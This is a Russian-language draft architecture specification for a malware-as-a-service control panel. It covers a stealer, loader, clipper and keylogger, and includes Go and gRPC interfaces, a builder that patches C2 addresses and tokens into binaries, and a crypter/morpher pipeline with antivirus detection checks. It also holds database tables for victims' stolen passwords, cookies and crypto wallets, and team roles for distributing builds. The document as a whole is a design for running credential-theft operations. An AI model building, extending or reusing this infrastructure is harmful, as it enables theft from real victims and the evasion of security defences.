# Eidos Panel — Архитектурная спецификация

**Версия:** 0.1 (черновик)
**Цель:** Единая панель управления для всей экосистемы Eidos — Loader, Stealer, Clipper, Keylogger и любых будущих модулей.
**Язык:** Go (ядро) + React/TypeScript (фронтенд)
**Архитектура:** Модульная, плагиноподобная. Каждый модуль — независимый gRPC-сервис.

---

## 1. Общая концепция

### 1.1 Что такое Eidos Panel

Eidos Panel — это центральный сервер, который:
- Принимает данные от всех модулей (логи, статистику, ошибки)
- Предоставляет билдер для каждого модуля (генерация бинарников с конфигом)
- Управляет пользователями, лицензиями, API ключами
- Отправляет уведомления (Telegram, Discord, Email)
- Хранит всё в одной БД (SQLite для solo, PostgreSQL для team)

### 1.2 Что НЕ делает Eidos Panel

- **НЕ компилирует** модули. Каждый модуль (Stealer, Loader и т.д.) компилируется на машине разработчика. В панель загружается **уже готовый бинарник** (base.exe/base.dll/base.elf).
- **НЕ переписывает** логику модуля. Панель только **патчит** конфиг в бинарнике (заменяет C2 URL, токены, ключи) и применяет инструменты (криптер, морфер).
- **НЕ запускает** непроверенный код от клиентов. Клиент получает проморфленный бинарник и делает с ним что хочет.

### 1.3 Модульность через gRPC

Каждый модуль (Mirage Stealer, Eidos Loader, Eidos Clipper) — отдельный процесс на любом языке, который общается с панелью по **gRPC**. Панель НЕ требует, чтобы модуль был на Go.

Это позволяет:
- Писать модули на Zig (как Stealer), Go (Loader), Rust (Clipper)
- Обновлять модули независимо от панели
- Подключать модули разных разработчиков

### 1.4 Tools (инструменты)

Инструменты — это внешние утилиты, которые запускаются панелью в пайплайне билда:

| Tool | Язык | Назначение |
|------|------|-----------|
| Crypter | Любой (Rust/C++/Go) | Шифрование/обфускация готового бинарника |
| Binder | Любой | Сшивка нескольких PE в один |
| Morpher | Любой (Python/C++) | ASM-морфинг, junk code, секции |
| Scanner | Любой | Проверка на VT/детекты |

Каждый Tool — это отдельный бинарник, который панель запускает с `input → output`.

---

## 2. Технический стек

### 2.1 Ядро (Core)

| Компонент | Технология | Почему |
|-----------|-----------|--------|
| Язык | **Go 1.24+** | Один бинарник, кроссплатформенность, горутины |
| HTTP фреймворк | **Gin** или **Chi** | Лёгкий, быстрый, много middleware |
| gRPC | **google.golang.org/grpc** | Стандарт для микросервисов |
| База данных | **GORM** + **SQLite**/**PostgreSQL** | ORM с поддержкой обеих БД |
| Фронтенд | **React 19** + **TypeScript** | Самая популярная экосистема |
| UI Kit | **Ant Design** или **shadcn/ui** | Готовые компоненты, тёмная тема |
| Сборка фронтенда | **Vite** | Быстрая сборка, встроенный embed |

### 2.2 Почему Go, а не C#/Python

| Критерий | Go | C# ASP.NET | Python |
|----------|----|-----------|--------|
| Размер бинарника | ~15 MB | ~70 MB + .NET runtime | ~50 MB + Python |
| Запуск на сервере | `./panel` | `dotnet run` | `uvicorn app:app` |
| Кроссплатформенность | ✅ нативно | 🟡 .NET 8+ | ✅ |
| Производительность | 🟢 50k req/s | 🟢 80k req/s | 🟠 5k req/s |
| Встраивание фронтенда | ✅ `//go:embed` | ❌ | ❌ |

---

## 3. Архитектура ядра (Core)

### 3.1 Структура проекта

```
eidos-panel/
├── cmd/
│   └── panel/
│       └── main.go              # Точка входа, сборка модулей
├── internal/
│   ├── core/
│   │   ├── auth.go              # JWT, API keys, роли
│   │   ├── config.go            # Загрузка конфига (YAML/env)
│   │   ├── db.go                # GORM: миграции, SQLite/PostgreSQL
│   │   ├── storage.go           # Файловое хранилище (локально/S3)
│   │   ├── events.go            # Event bus (лог → уведомления)
│   │   └── panel.go             # Главный оркестратор
│   ├── router.go                # Маршрутизация + middleware
│   └── handlers/                # Общие handler'ы (health, auth, users)
├── modules/                     # Модули Eidos
│   ├── mirage/                  # Mirage Stealer
│   ├── loader/                  # Eidos Loader
│   ├── clipper/                 # Eidos Clipper
│   ├── keylogger/               # Eidos Keylogger
│   └── _template/               # Шаблон для нового модуля
├── tools/                       # Инструменты билд-пайплайна
│   ├── crypter/
│   ├── binder/
│   ├── morpher/
│   └── scanner/
├── frontend/                    # React SPA
│   ├── src/
│   │   ├── core/               # Layout, auth, общие компоненты
│   │   ├── modules/            # Страницы каждого модуля
│   │   │   ├── mirage/
│   │   │   ├── loader/
│   │   │   └── ...
│   │   └── App.tsx
│   ├── package.json
│   └── vite.config.ts
├── go.mod
├── go.sum
└── Dockerfile
```

### 3.2 Module Interface (Go)

```go
// internal/core/module.go
package core

import (
    "gorm.io/gorm"
    "google.golang.org/grpc"
)

// Module — интерфейс, который должен реализовать каждый модуль
type Module interface {
    // ID — уникальный идентификатор модуля ("mirage", "loader")
    ID() string
    
    // Name — человекочитаемое имя ("Mirage Stealer")
    Name() string
    
    // Icon — иконка для фронтенда (emoji или имя из Heroicons)
    Icon() string
    
    // Description — краткое описание
    Description() string
    
    // Version — версия модуля
    Version() string
    
    // HTTP Routes — регистрирует свои endpoint'ы
    // Панель автоматически добавляет префикс /api/{module.ID}/
    Router(r *Router)
    
    // Database — миграции БД для этого модуля
    // Возвращает список моделей для GORM AutoMigrate
    Models() []interface{}
    
    // Menu — пункты бокового меню для фронтенда
    Menu() []MenuItem
    
    // Permissions — права доступа, которые модуль добавляет
    Permissions() []Permission
    
    // Build — конфигурация билдера
    BuildConfig() *BuildConfig
    
    // Init — вызывается при старте панели
    Init(db *gorm.DB, storage Storage) error
}

// Router — обёртка над Gin/Chi
type Router interface {
    GET(path string, handler HandlerFunc, middlewares ...Middleware)
    POST(path string, handler HandlerFunc, middlewares ...Middleware)
    DELETE(path string, handler HandlerFunc, middlewares ...Middleware)
}

type MenuItem struct {
    Title    string    // "Dashboard", "Sessions", "Builder"
    Path     string    // "/mirage/dashboard"
    Icon     string    // "ChartBarIcon"
    Badge    int       // Количество непрочитанных (0 = не показывать)
    Requires []string  // Права доступа
}

type BuildConfig struct {
    Enabled bool
    // Поля конфига, которые заполняет пользователь в билдере
    Fields  []BuildField
}

type BuildField struct {
    Name        string      // "c2_host"
    Label       string      // "C2 Server Address"
    Type        FieldType   // text, password, boolean, file, select
    Default     interface{}
    Required    bool
    Description string
    Options     []string    // для select
}
```

### 3.3 gRPC Module Service

Если модуль — внешний процесс (например, на Zig), он реализует gRPC сервер. Панель подключается к нему как к клиенту.

```protobuf
// api/module.proto
syntax = "proto3";
package eidos;

service ModuleService {
    // Информация о модуле
    rpc GetModuleInfo(Empty) returns (ModuleInfo);
    
    // Принять лог от агента (Stealer/Loader/Clipper)
    // Панель проксирует HTTP → gRPC
    rpc IngestLog(IngestLogRequest) returns (IngestLogResponse);
    
    // Построить билд с заданным конфигом
    rpc BuildBinary(BuildRequest) returns (BuildResponse);
    
    // Получить статистику
    rpc GetStats(StatsRequest) returns (StatsResponse);
    
    // Health check
    rpc HealthCheck(Empty) returns (HealthResponse);
}

message ModuleInfo {
    string id = 1;
    string name = 2;
    string version = 3;
    string description = 4;
    string icon = 5;
    repeated Field config_fields = 6;
}

message IngestLogRequest {
    string module_id = 1;
    string agent_id = 2;
    string data_type = 3; // "session", "keylog", "clipper_event"
    bytes payload = 4;
    map<string, string> metadata = 5;
}

message BuildRequest {
    string build_id = 1;
    map<string, string> config = 2; // C2_host, tg_token и т.д.
    bytes base_binary = 3;          // base.exe (готовый бинарник)
    bytes icon = 4;                 // опционально: .ico файл
    repeated string tool_pipeline = 5; // ["crypter", "morpher"]
}
```

### 3.4 Tools Pipeline

Каждый Tool реализует простой интерфейс:

```go
// internal/core/tool.go
type Tool interface {
    Name() string                               // "crypter", "binder"
    Process(input []byte, config map[string]string) ([]byte, error)
}
```

Tool может быть:
- Встроенным Go пакетом (`go tools/crypter`)
- Внешним бинарником (`/usr/bin/eidos-crypter --input x --output y`)
- gRPC сервисом (как модуль)

Пайплайн билда:
```
1. Base binary (загруженный заранее)
2. Patch config (XOR ключи, C2 URL, токены)
3. Tool: Crypter (опционально)
4. Tool: Binder (опционально)
5. Tool: Morpher (опционально)
6. Scan (опционально, проверка на VT)
7. Готовый билд → в Storage
```

---

## 4. База данных

### 4.1 Core таблицы (общие для всех модулей)

```sql
-- Пользователи
CREATE TABLE users (
    id          TEXT PRIMARY KEY,          -- UUID
    username    TEXT NOT NULL UNIQUE,
    password    TEXT NOT NULL,             -- bcrypt hash
    email       TEXT,
    role        TEXT NOT NULL DEFAULT 'user', -- admin, user, worker
    tier        TEXT NOT NULL DEFAULT 'starter', -- starter, pro, team
    created_at  TIMESTAMP,
    updated_at  TIMESTAMP
);

-- Сессии (JWT refresh tokens)
CREATE TABLE sessions (
    id          TEXT PRIMARY KEY,
    user_id     TEXT REFERENCES users(id),
    token       TEXT NOT NULL UNIQUE,
    expires_at  TIMESTAMP,
    created_at  TIMESTAMP
);

-- API ключи
CREATE TABLE api_keys (
    id          TEXT PRIMARY KEY,
    user_id     TEXT REFERENCES users(id),
    key_hash    TEXT NOT NULL,             -- SHA256(api_key)
    name        TEXT NOT NULL,             -- "Мой скрипт"
    permissions TEXT NOT NULL,             -- JSON array
    rate_limit  INTEGER DEFAULT 60,        -- requests/min
    expires_at  TIMESTAMP,
    created_at  TIMESTAMP
);

-- Лицензии
CREATE TABLE licenses (
    id          TEXT PRIMARY KEY,
    user_id     TEXT REFERENCES users(id),
    tier        TEXT NOT NULL,             -- starter, pro, team, lifetime
    expires_at  TIMESTAMP,
    activated   BOOLEAN DEFAULT false,
    hwids       TEXT,                      -- JSON array привязанных HWID
    created_at  TIMESTAMP
);

-- Инвайт-коды для воркеров
CREATE TABLE invite_codes (
    id          TEXT PRIMARY KEY,
    creator_id  TEXT REFERENCES users(id),
    role        TEXT NOT NULL,             -- traffer, checker, vbiver
    max_uses    INTEGER DEFAULT 1,
    used_count  INTEGER DEFAULT 0,
    expires_at  TIMESTAMP,
    created_at  TIMESTAMP
);

-- Воркеры (Team)
CREATE TABLE workers (
    id          TEXT PRIMARY KEY,
    owner_id    TEXT REFERENCES users(id),
    username    TEXT NOT NULL UNIQUE,
    password    TEXT NOT NULL,             -- bcrypt hash
    role        TEXT NOT NULL,             -- traffer, checker, vbiver
    permissions TEXT NOT NULL,             -- JSON array
    build_tags  TEXT,                      -- JSON array привязанных тегов
    active      BOOLEAN DEFAULT true,
    last_login  TIMESTAMP,
    created_at  TIMESTAMP
);

-- Баны (HWID + IP)
CREATE TABLE bans (
    id          TEXT PRIMARY KEY,
    hwid        TEXT,
    ip          TEXT,
    reason      TEXT,
    banned_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at  TIMESTAMP,                 -- NULL = навсегда
    banned_by   TEXT REFERENCES users(id)
);

-- Аудит (лог действий воркеров)
CREATE TABLE audit_log (
    id          TEXT PRIMARY KEY,
    user_id     TEXT REFERENCES users(id),
    action      TEXT NOT NULL,             -- "view_log", "download_build"
    details     TEXT,                      -- JSON с деталями
    ip          TEXT,
    created_at  TIMESTAMP
);

-- Комментарии к логам
CREATE TABLE comments (
    id          TEXT PRIMARY KEY,
    log_id      TEXT NOT NULL,             -- ID лога (любого модуля)
    module_id   TEXT NOT NULL,             -- "mirage", "keylogger"
    user_id     TEXT REFERENCES users(id),
    text        TEXT NOT NULL,
    parent_id   TEXT REFERENCES comments(id), -- threaded
    created_at  TIMESTAMP
);
```

### 4.2 Таблицы модулей (пример для Mirage)

```sql
-- Сессии Mirage (одна запись = один лог)
CREATE TABLE mirage_sessions (
    id          TEXT PRIMARY KEY,
    build_id    TEXT,
    build_tag   TEXT,
    hwid        TEXT,
    ip          TEXT,
    country     TEXT,
    os          TEXT,
    username    TEXT,
    computer    TEXT,
    browser     TEXT,
    created_at  TIMESTAMP,
    viewed      BOOLEAN DEFAULT false,
    duplicate   BOOLEAN DEFAULT false,
    duplicate_of TEXT,
    comment     TEXT
);

-- Пароли
CREATE TABLE mirage_passwords (
    id          TEXT PRIMARY KEY,
    session_id  TEXT REFERENCES mirage_sessions(id),
    url         TEXT,
    username    TEXT,
    password    TEXT,
    browser     TEXT
);

-- Куки
CREATE TABLE mirage_cookies (
    id          TEXT PRIMARY KEY,
    session_id  TEXT REFERENCES mirage_sessions(id),
    domain      TEXT,
    name        TEXT,
    path        TEXT,
    value       TEXT
);

-- Кошельки
CREATE TABLE mirage_wallets (
    id          TEXT PRIMARY KEY,
    session_id  TEXT REFERENCES mirage_sessions(id),
    name        TEXT,
    type        TEXT,  -- "extension", "desktop"
    files_count INTEGER
);

-- Билды
CREATE TABLE mirage_builds (
    id          TEXT PRIMARY KEY,
    tag         TEXT,
    config      TEXT NOT NULL,             -- JSON
    icon_hash   TEXT,
    file_size   INTEGER,
    download_count INTEGER DEFAULT 0,
    created_by  TEXT REFERENCES users(id),
    created_at  TIMESTAMP,
    expires_at  TIMESTAMP
);
```

---

## 5. Фронтенд (React SPA)

### 5.1 Структура

```
frontend/
├── src/
│   ├── core/
│   │   ├── components/         # Общие компоненты
│   │   │   ├── Layout.tsx      # Боковое меню + хедер
│   │   │   ├── DataTable.tsx   # Умная таблица (сортировка, фильтры)
│   │   │   ├── LogCard.tsx     # Карточка лога
│   │   │   ├── Flag.tsx        # Флаг страны
│   │   │   └── Charts.tsx      # Графики (Recharts)
│   │   ├── hooks/              # useAuth, useApi, useWebSocket
│   │   ├── api/                # Axios клиент + типы
│   │   ├── store/              # Zustand store (auth, theme, filters)
│   │   └── types.ts            # Core TypeScript типы
│   │
│   ├── modules/
│   │   ├── mirage/
│   │   │   ├── Dashboard.tsx   # Дашборд: карточки + графики
│   │   │   ├── Sessions.tsx    # Таблица логов с фильтрами
│   │   │   ├── Session.tsx     # Детальный просмотр лога
│   │   │   ├── Builder.tsx     # Форма билдера
│   │   │   └── Search.tsx      # Поиск по всем данным
│   │   │
│   │   ├── loader/
│   │   │   ├── Dashboard.tsx
│   │   │   ├── Builds.tsx
│   │   │   └── Installations.tsx
│   │   │
│   │   ├── clipper/
│   │   │   ├── Dashboard.tsx
│   │   │   └── Transactions.tsx
│   │   │
│   │   ├── keylogger/
│   │   │   ├── Dashboard.tsx
│   │   │   └── Keylogs.tsx
│   │   │
│   │   └── _template/          # Шаблон нового модуля
│   │       ├── Dashboard.tsx
│   │       └── index.ts
│   │
│   ├── App.tsx                  # Собирает всё из modules/*/index.ts
│   └── main.tsx
│
├── package.json
└── vite.config.ts
```

### 5.2 Регистрация модуля во фронтенде

Каждый модуль экспортирует `register()` функцию:

```typescript
// frontend/src/modules/mirage/index.ts
import { registerModule } from '../../core/moduleRegistry';

registerModule({
    id: 'mirage',
    name: 'Mirage Stealer',
    icon: '🦠',
    routes: [
        { path: '/mirage', component: Dashboard, menu: { title: 'Dashboard', badge: 'live' } },
        { path: '/mirage/sessions', component: Sessions, menu: { title: 'Sessions' } },
        { path: '/mirage/session/:id', component: Session, menu: null },
        { path: '/mirage/builder', component: Builder, menu: { title: 'Builder' } },
        { path: '/mirage/search', component: Search, menu: { title: 'Search' } },
    ],
    permissions: ['mirage:view', 'mirage:build', 'mirage:delete'],
});
```

### 5.3 Ключевые UI-компоненты

| Компонент | Назначение |
|-----------|-----------|
| `DataTable` | Умная таблица: колонки, сортировка, фильтры, пагинация, column blur |
| `LogCard` | Карточка жертвы: IP, страна, OC, количество данных, пароли |
| `ChartWidget` | График: LiveCharts-подобный на Recharts |
| `BuilderForm` | Форма с полями из BuildConfig модуля |
| `SessionDetail` | Детальный просмотр: пароли, куки, кошельки, файлы |
| `SearchBar` | Полнотекстовый поиск с фильтрами |
| `ThemeToggle` | Светлая/тёмная тема |

---

## 6. API Endpoints

### 6.1 Core endpoints

```
POST   /api/auth/login           — Вход (JWT)
POST   /api/auth/register        — Регистрация (по инвайт-коду)
POST   /api/auth/refresh         — Обновление JWT

GET    /api/users/me             — Текущий пользователь
PUT    /api/users/me             — Обновление профиля
GET    /api/users                — Список пользователей (admin)
POST   /api/users/:id/ban       — Забанить пользователя

GET    /api/keys                 — API ключи
POST   /api/keys                 — Создать ключ
DELETE /api/keys/:id             — Удалить ключ

GET    /api/workers              — Воркеры (Team)
POST   /api/workers/invite       — Создать инвайт-код
POST   /api/workers/:id/deactivate

GET    /api/bans                 — Список банов
POST   /api/bans                 — Добавить бан (HWID/IP)
DELETE /api/bans/:id             — Снять бан

GET    /api/modules              — Список подключенных модулей
GET    /api/modules/:id/info     — Информация о модуле

GET    /api/stats                — Общая статистика
GET    /api/stats/module/:id     — Статистика модуля

GET    /api/events               — Event bus (SSE/WebSocket)
```

### 6.2 Module endpoints (пример для Mirage)

Эти endpoint'ы регистрируются самим модулем через `Module.Router()`:

```
POST   /api/mirage/log           — Принять лог от стилера
POST   /api/mirage/log/chunk     — Принять чанк лога
POST   /api/mirage/log/complete  — Завершить чанкованный лог
GET    /api/mirage/sessions      — Список сессий (с фильтрами)
GET    /api/mirage/sessions/:id  — Детали сессии
DELETE /api/mirage/sessions/:id  — Удалить сессию
GET    /api/mirage/sessions/:id/download — Скачать архив лога
POST   /api/mirage/search        — Поиск по паролям/кукам
POST   /api/mirage/build         — Создать билд
GET    /api/mirage/builds        — Список билдов
GET    /api/mirage/builds/:id/download — Скачать билд
```

### 6.3 Tool endpoints

```
GET    /api/tools                — Список доступных инструментов
POST   /api/tools/:id/process   — Запустить инструмент (file upload → download)
```

---

## 7. Установка и запуск

### 7.1 Разработка

```bash
# Бэкенд
cd eidos-panel
go run cmd/panel/main.go --dev --db sqlite

# Фронтенд (отдельно)
cd frontend
npm install
npm run dev -- --proxy http://localhost:8443
```

### 7.2 Продакшен

```bash
# Сборка
cd eidos-panel
make build    # Собирает фронтенд → embed → один panel бинарник

# Запуск
./panel --config config.yaml

# Или Docker
docker run -d -p 8443:8443 -v ./data:/data eidos/panel
```

### 7.3 Dockerfile

```dockerfile
FROM node:20 AS frontend
WORKDIR /app
COPY frontend/ ./
RUN npm install && npm run build

FROM golang:1.24 AS backend
WORKDIR /app
COPY . ./
COPY --from=frontend /app/dist ./frontend/dist
RUN CGO_ENABLED=0 go build -o panel ./cmd/panel/main.go

FROM alpine:3.20
RUN apk add --no-cache ca-certificates
COPY --from=backend /app/panel /usr/bin/panel
EXPOSE 8443
ENTRYPOINT ["panel", "--config", "/etc/eidos/config.yaml"]
```

---

## 8. Добавление нового модуля (пошагово)

### Шаг 1: Создать Go package

```go
// modules/mymodule/module.go
package mymodule

import "eidos-panel/internal/core"

func init() {
    core.Register(&Module{})
}

type Module struct{}

func (m *Module) ID() string { return "mymodule" }
func (m *Module) Name() string { return "My Cool Module" }
func (m *Module) Icon() string { return "🔌" }
func (m *Module) Description() string { return "Описание модуля" }
func (m *Module) Version() string { return "1.0.0" }
func (m *Module) Router(r core.Router) {
    // POST /api/mymodule/log
    r.POST("/log", m.handleLog)
}
func (m *Module) Models() []interface{} {
    return []interface{}{&MyModuleLog{}}
}
func (m *Module) Menu() []core.MenuItem {
    return []core.MenuItem{
        {Title: "Dashboard", Path: "/mymodule", Icon: "ChartBarIcon"},
        {Title: "Logs", Path: "/mymodule/logs", Icon: "DocumentTextIcon"},
    }
}
func (m *Module) Permissions() []core.Permission {
    return []core.Permission{
        {ID: "mymodule:view", Name: "View logs"},
        {ID: "mymodule:delete", Name: "Delete logs"},
    }
}
func (m *Module) Init(db *gorm.DB, storage core.Storage) error {
    return db.AutoMigrate(&MyModuleLog{})
}
```

### Шаг 2: Создать фронтенд

```typescript
// frontend/src/modules/mymodule/index.ts
import { registerModule } from '../../core/moduleRegistry';
import Dashboard from './Dashboard';

registerModule({
    id: 'mymodule',
    name: 'My Cool Module',
    icon: '🔌',
    routes: [
        { path: '/mymodule', component: Dashboard, menu: { title: 'Dashboard' } },
    ],
});
```

### Шаг 3: Зарегистрировать в main.go

```go
// cmd/panel/main.go
package main

import (
    "eidos-panel/internal/core"
    _ "eidos-panel/modules/mymodule"  // init() зарегистрирует модуль
)

func main() {
    panel := core.NewPanel()
    panel.Start(":8443")
}
```

---

## 9. Roadmap реализации

| Этап | Что делаем | Время |
|------|-----------|-------|
| **1. Core** | Auth (JWT), DB (GORM), Router (Chi), Storage, Users, Bans | 3 дня |
| **2. Mirage Module** | Приём логов, билдер, таблицы, экспорт API | 3 дня |
| **3. Frontend Core** | Layout, DataTable, LogCard, Charts, Theme | 3 дня |
| **4. Mirage Frontend** | Dashboard, Sessions, Session Detail, Builder, Search | 3 дня |
| **5. Team/API** | Workers, инвайты, API keys, rate limiting | 2 дня |
| **6. Уведомления** | Telegram боты (до 15), Discord webhooks, Event bus | 2 дня |
| **7. Tools** | Crypter, Binder, Morpher, Scanner pipeline | 2 дня |
| **8. Loader Module** | Builds, Installs, Stats (фронт + бэк) | 2 дня |
| **9. Clipper Module** | Transactions, Stats (фронт + бэк) | 1 день |
| **10. Keylogger Module** | Keylog viewer, Search (фронт + бэк) | 1 день |
| **Всего** | **~22 дня** | |
